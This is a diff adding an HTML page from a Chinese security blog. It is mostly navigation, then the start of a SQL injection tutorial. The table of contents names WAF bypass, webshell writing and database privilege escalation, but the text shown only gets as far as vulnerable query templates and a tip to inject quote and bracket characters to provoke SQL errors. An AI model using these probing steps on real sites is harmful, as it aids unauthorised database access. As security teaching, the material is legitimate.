@@ -1,0 +1,1243 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Web安全之SQL注入漏洞 | UltramanGaia&#39;s Blog</title>
+  <meta name="keywords" content=" SQL ">
+  <meta name="description" content="Web安全之SQL注入漏洞 | UltramanGaia&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="http://ultramangaia.github.io/categories/index.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-12-23T08:37:16.000Z">
+<meta property="article:modified_time" content="2019-01-19T16:10:04.947Z">
+<meta property="article:author" content="UltramanGaia">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/sublime.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+</div>
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>UltramanGaia</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/UltramanGaia" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:3213359017@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=3213359017&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active" data-rel="全部文章">全部文章<small>(35)</small></div></li>
+    
+        
+            
+            <li><div data-rel="Web"><i class="fold iconfont icon-right"></i>Web<small>(26)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Web<--->Web安全">Web安全<small>(7)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->Writeup">Writeup<small>(14)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->漏洞挖掘">漏洞挖掘<small>(5)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Java"><i class="fold iconfont icon-right"></i>Java<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Java<--->Java安全">Java安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PHP"><i class="fold iconfont icon-right"></i>PHP<small>(4)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="PHP<--->PHP安全">PHP安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="PHP<--->漏洞分析">漏洞分析<small>(3)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="其它"><i class="fold iconfont icon-right"></i>其它<small>(3)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="其它<--->智能合约">智能合约<small>(2)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="其它<--->机器学习">机器学习<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="二进制"><i class="fold iconfont icon-right"></i>二进制<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="二进制<--->PWN">PWN<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="35">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://ultramangaia.cn/">UltramanGaia</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" />
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ctf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Java</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>lua</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PWN</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sqlmap</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>stackoverflow</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ThinkPHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>writeup</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSS</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSSI</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XXE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ysoserial</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>代码执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>智能合约</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>机器学习</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞挖掘</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>请求走私</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2019/Xiaomi-Series-Router-Command-Execution-Vulnerability.html"
+           data-tag="漏洞挖掘,lua"
+           data-author="" >
+            <span class="post-title" title="小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）">小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）</span>
+            <span class="post-date" title="2019-03-09 14:41:12">2019/03/09</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty请求走私漏洞（CVE-2020-11724）">OpenResty请求走私漏洞（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/WebswingJsLink%E6%9C%BA%E5%88%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）">Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/Webswing-JsLink-Mechanism-Remote-Code-Execution-Vulnerability-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）">Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty-Http-Request-Smuggling-Vulnerability-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty Http request smuggling Vulnerability（CVE-2020-11724）">OpenResty Http request smuggling Vulnerability（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSSI%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSSI"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSSI漏洞">Web安全之XSSI漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 Java Java安全 "
+           href="/blog/2018/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html"
+           data-tag="Java,ysoserial,反序列化"
+           data-author="" >
+            <span class="post-title" title="Java反序列化漏洞">Java反序列化漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析,ThinkPHP,SQL"
+           data-author="" >
+            <span class="post-title" title="ThinkPHP 3.X-5.X order by注入漏洞分析">ThinkPHP 3.X-5.X order by注入漏洞分析</span>
+            <span class="post-date" title="2018-09-14 10:00:41">2018/09/14</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/Ethernaut%E9%9D%B6%E5%9C%BAwriteup.html"
+           data-tag="writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="Ethernaut 靶场 Writeup">Ethernaut 靶场 Writeup</span>
+            <span class="post-date" title="2018-06-01 18:12:04">2018/06/01</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/0ctf-%E7%BA%BF%E4%B8%8B-misc-ZeroLottery.html"
+           data-tag="ctf,writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="0CTF 线下 Misc ZeroLottery Writeup">0CTF 线下 Misc ZeroLottery Writeup</span>
+            <span class="post-date" title="2018-05-29 19:10:40">2018/05/29</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/starctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="StarCTF 2018 Writeup">StarCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-23 20:50:00">2018/04/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/ddctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DDCTF 2018 Writeup">DDCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-21 03:38:49">2018/04/21</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/DedeCMS5-7%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="DedeCMS 5.7 后台两处RCE漏洞分析">DedeCMS 5.7 后台两处RCE漏洞分析</span>
+            <span class="post-date" title="2018-04-15 20:50:27">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/Drupal-Drupalgeddon-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2018-7600.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="Drupal Drupalgeddon 2远程代码执行漏洞分析">Drupal Drupalgeddon 2远程代码执行漏洞分析</span>
+            <span class="post-date" title="2018-04-15 01:37:57">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="命令注入"
+           data-author="" >
+            <span class="post-title" title="Web安全之命令注入漏洞">Web安全之命令注入漏洞</span>
+            <span class="post-date" title="2018-04-08 19:56:45">2018/04/08</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XXE"
+           data-author="" >
+            <span class="post-title" title="Web安全之XXE漏洞">Web安全之XXE漏洞</span>
+            <span class="post-date" title="2018-04-06 11:53:41">2018/04/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/0ctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="0CTF 2018 Writeup">0CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-03 16:53:31">2018/04/03</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2018 Writeup">强网杯 CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-30 12:47:57">2018/03/30</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSS"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSS漏洞">Web安全之XSS漏洞</span>
+            <span class="post-date" title="2018-03-26 17:57:09">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 二进制 PWN "
+           href="/blog/2018/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PWN,stackoverflow"
+           data-author="" >
+            <span class="post-title" title="二进制安全之栈溢出漏洞">二进制安全之栈溢出漏洞</span>
+            <span class="post-date" title="2018-03-26 00:51:47">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/pragyan-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pragyan CTF 2018 Writeup">Pragyan CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-03 00:48:28">2018/03/03</span>
+        </a>
+        
+        <a  class="全部文章 PHP PHP安全 "
+           href="/blog/2018/PHP%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PHP"
+           data-author="" >
+            <span class="post-title" title="PHP安全之文件包含漏洞">PHP安全之文件包含漏洞</span>
+            <span class="post-date" title="2018-03-02 19:21:59">2018/03/02</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/Xiomara-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Xiomara CTF 2018 Writeup">Xiomara CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-02-28 20:23:22">2018/02/28</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="SQL"
+           data-author="" >
+            <span class="post-title" title="Web安全之SQL注入漏洞">Web安全之SQL注入漏洞</span>
+            <span class="post-date" title="2018-02-23 13:57:25">2018/02/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="Web安全之文件上传漏洞">Web安全之文件上传漏洞</span>
+            <span class="post-date" title="2018-02-11 11:27:17">2018/02/11</span>
+        </a>
+        
+        <a  class="全部文章 其它 机器学习 "
+           href="/blog/2017/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0.html"
+           data-tag="机器学习"
+           data-author="" >
+            <span class="post-title" title="机器学习">机器学习</span>
+            <span class="post-date" title="2017-12-27 14:38:27">2017/12/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/DVWA-%E9%9D%B6%E5%9C%BA-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DVWA 靶场 Writeup">DVWA 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-05 20:00:04">2017/12/05</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/webug3-0-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Webug3.0 靶场 Writeup">Webug3.0 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-04 19:46:57">2017/12/04</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2017 Writeup">强网杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:36:03">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/gctf-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="GCTF 2017 Writeup">GCTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:31:56">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E4%B8%96%E5%AE%89%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="世安杯 CTF 2017 Writeup">世安杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:21:19">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/pwn2win-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pwn2win CTF 2017 Writeup">Pwn2win CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:11:00">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E6%B9%96%E6%B9%98%E6%9D%AF-2017-ctf.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="湖湘杯 CTF 2017 Writeup">湖湘杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-25 19:42:32">2017/11/25</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/hitcon-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Hitcon CTF 2017 Writeup">Hitcon CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-06 17:34:33">2017/11/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2017/%E7%BC%96%E5%86%99sqlmap-Tamper%E7%BB%95%E8%BF%87Waf.html"
+           data-tag="ctf,sqlmap"
+           data-author="" >
+            <span class="post-title" title="编写sqlmap Tamper绕过Waf">编写sqlmap Tamper绕过Waf</span>
+            <span class="post-date" title="2017-10-12 17:10:31">2017/10/12</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Web安全之SQL注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Web安全之SQL注入漏洞</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Web">Web</a> > 
+            
+            <a  data-rel="Web&lt;---&gt;Web安全">Web安全</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">SQL</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2020-07-17 00:32:03'>2018-02-23 13:57</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#最常见的注入"><span class="toc-text">最常见的注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql"><span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入方法"><span class="toc-text">注入方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Union-Select注入"><span class="toc-text">Union Select注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#带外注入"><span class="toc-text">带外注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#小众注入位置"><span class="toc-text">小众注入位置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取信息"><span class="toc-text">获取信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#最常用的获取数据方法"><span class="toc-text">最常用的获取数据方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#库名"><span class="toc-text">库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#表名"><span class="toc-text">表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列名"><span class="toc-text">列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据"><span class="toc-text">数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#双注入Double-Injection"><span class="toc-text">双注入Double Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#读文件"><span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#输出到文件中-需要知道绝对路径"><span class="toc-text">输出到文件中(需要知道绝对路径)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二次排序注入-存储型的注入"><span class="toc-text">二次排序注入 (存储型的注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入"><span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入点-update-insert-delete"><span class="toc-text">注入点 update &#x2F; insert &#x2F;delete</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF绕过"><span class="toc-text">WAF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤型"><span class="toc-text">过滤型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检测型"><span class="toc-text">检测型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql提权"><span class="toc-text">Mysql提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#udf提权"><span class="toc-text">udf提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mof提权"><span class="toc-text">mof提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mssql"><span class="toc-text">mssql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入-1"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#输出到文件，上传木马"><span class="toc-text">输出到文件，上传木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hex编码绕过waf"><span class="toc-text">hex编码绕过waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#boolean盲注"><span class="toc-text">boolean盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dnslog注入"><span class="toc-text">dnslog注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle"><span class="toc-text">Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dnslog注入-1"><span class="toc-text">dnslog注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Postgresql"><span class="toc-text">Postgresql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dnslog注入-2"><span class="toc-text">dnslog注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思维导图"><span class="toc-text">思维导图</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <pre><code>用户输入数据被当成了代码被执行
+原则
+有回显:union select、报错注入
+无回显:dnslog, time-based, boolean-based
+注：思维导图https://github.com/UltramanGaia/SecMM</code></pre><h2 id="最常见的注入"><a href="#最常见的注入" class="headerlink" title="最常见的注入"></a>最常见的注入</h2><pre><code>select * from xxx where id = %s ;
+select * from xxx where id = &#39;%s&#39; ;
+select * from xxx where id = &quot;%s&quot; ;
+select * from xxx where id = (&#39;%s&#39;) ;
+select * from xxx where id = (&quot;%s&quot;) ;</code></pre><pre><code>用
+&#39;
+&quot;
+(
+)
+char
+string
+组合看看能不能报错显示出执行的sql语句
